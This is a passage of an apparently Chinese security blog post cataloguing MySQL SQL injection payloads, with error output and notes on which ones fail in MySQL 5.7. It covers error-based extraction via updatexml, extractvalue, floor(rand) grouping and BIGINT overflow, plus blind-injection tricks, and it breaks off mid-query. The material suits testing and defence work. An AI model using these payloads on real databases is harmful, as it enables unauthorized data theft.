&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">all&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Error&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Column&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cannot&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">be&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">实测发现在&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MySQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">中不好使了，会出现&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1242&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">21000&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Subquery&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">returns&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">more&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">than&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">row&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="insert">insert&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">insert&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">into&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">passwd&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">values&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;3&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Error&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Column&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cannot&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">be&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">要先得到列名，。而且实测&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MySQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">里对主键&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="err">自增&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="err">非空，即使直接&lt;/span>&lt;span class="k">insert&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">也会成功。&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="join">join&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Error&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Duplicate&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">column&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">同样失效了。&lt;/span>&lt;span class="n">MySQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">下会返回重复的列名。&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="获取值">获取值&lt;/h3>
&lt;h4 id="count-floorrand02-group-by">count floor(rand(0)*2) group by&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">COUNT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">CONCAT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">FLOOR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">RAND&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">GROUP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1062&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">23000&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Duplicate&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;5.7.331&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">key&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;group_key&amp;gt;&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">需要注意的是&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">COUNT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">不能少&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>&lt;em>Works because mysql insides executes this query by making two queries: add count of x into temp table and if error (x value does not exist) then insert x value (second time x calculation) into table&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;h4 id="bigint-unsigned">BIGINT UNSIGNED&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">在&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MySQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">不起效。&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">BIGINT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">UNSIGNED&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">is&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">out&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">range&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;((not((select `x`.`version()` from (select version() AS `version()`) `x`))) - ~(0))&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>不过还存在一个能爆出列名的 payload。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">18446744073709551610&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">18446744073709551610&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">注意&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">18446744073709551610&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">就是&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1690&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">22001&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Data&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">truncation&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">BIGINT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">UNSIGNED&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">is&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">out&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">range&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;(2 * if(((select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1) &amp;gt; (select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1)),18446744073709551610,18446744073709551610))&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">这里会把&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">展开成具体列名&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="updatexml">updatexml&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1105&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">HY000&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">XPATH&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">syntax&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">error&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;~5.7.33&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="extractvalue">extractvalue&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">extractvalue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">()));&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1105&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">HY000&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">XPATH&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">syntax&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">error&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;~5.7.33&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="st_longfromgeohash">ST_LongFromGeoHash&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ST_LongFromGeoHash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">());&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MySQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1411&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">HY000&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Incorrect&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">geohash&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;5.7.33&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">function&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ST_LONGFROMGEOHASH&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="blind-sql-injection">blind SQL injection&lt;/h2>
&lt;p>两个技巧。&lt;/p>
&lt;h3 id="ifsubstringasciichar">if/substring/ascii/char&lt;/h3>
&lt;p>灵活运用 &lt;code>if&lt;/code>、&lt;code>substring&lt;/code>、&lt;code>ascii&lt;/code>、&lt;code>char&lt;/code> 这些函数。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OR&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">IF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FIND_IN_SET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="s1">&amp;#39;0,1,2,3,4,5&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="k">TRUE&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">FALSE&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>ascii&lt;/code>和&lt;code>char&lt;/code>两个函数主要是解决不能注入字符串之类的问题。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OR&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span 